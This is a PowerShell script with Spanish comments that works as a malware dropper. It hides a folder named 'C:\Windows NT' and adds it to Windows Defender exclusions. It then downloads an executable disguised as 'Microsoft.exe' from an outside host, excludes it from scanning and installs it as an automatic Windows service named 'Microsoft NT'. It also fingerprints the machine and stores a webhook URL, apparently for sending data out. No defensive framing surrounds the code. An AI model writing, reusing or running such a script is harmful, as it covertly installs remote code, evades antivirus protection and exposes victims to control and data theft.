# Definir la ruta de la carpeta como "C:\Windows NT"
$folderPath = "C:\Windows NT"
if (!(Test-Path $folderPath)) {
    # Crear la carpeta si no existe
    New-Item -ItemType Directory -Path $folderPath | Out-Null
}
# Marcar la carpeta como oculta
attrib +h $folderPath

# Agregar la carpeta a las exclusiones de Windows Defender
Add-MpPreference -ExclusionPath $folderPath

# Descargar el archivo Microsoft.exe desde GitHub y guardarlo en la carpeta creada
$downloadUrl = "https://baa4ts.is-a-good.dev/script/Microsoft.exe"
$outputFile = Join-Path $folderPath "Microsoft.exe"
Invoke-WebRequest -Uri $downloadUrl -OutFile $outputFile

# Agregar el ejecutable descargado a las exclusiones de Windows Defender
Add-MpPreference -ExclusionPath $outputFile

# Obtener información del CPU y la placa base para generar un identificador único
$CPU = (Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty ProcessorId)
$MOT = (Get-WmiObject -Class Win32_BaseBoard | Select-Object -ExpandProperty SerialNumber)
[System.Environment]::SetEnvironmentVariable("ID_PC", "$CPU$MOT", [System.EnvironmentVariableTarget]::Machine)

# Establecer la variable de entorno WEBHOOK_URL a nivel de máquina
$webhookUrl = "/api/webhooks/1357426364000637089/9TOnIaZkNvEgQ-qxRI3maiiuanJR7KaEiuhF1aGbGsIhUWtdhksXoS41aQJw2aZ5RJsH"
[System.Environment]::SetEnvironmentVariable("WEBHOOK_URL", $webhookUrl, [System.EnvironmentVariableTarget]::Machine)

# Instalar el servicio usando el ejecutable descargado
New-Service -Name "Microsoft NT" -BinaryPathName $outputFile -DisplayName "windows NT" -StartupType Automatic

# Iniciar el servicio
Start-Service -Name "Microsoft NT"
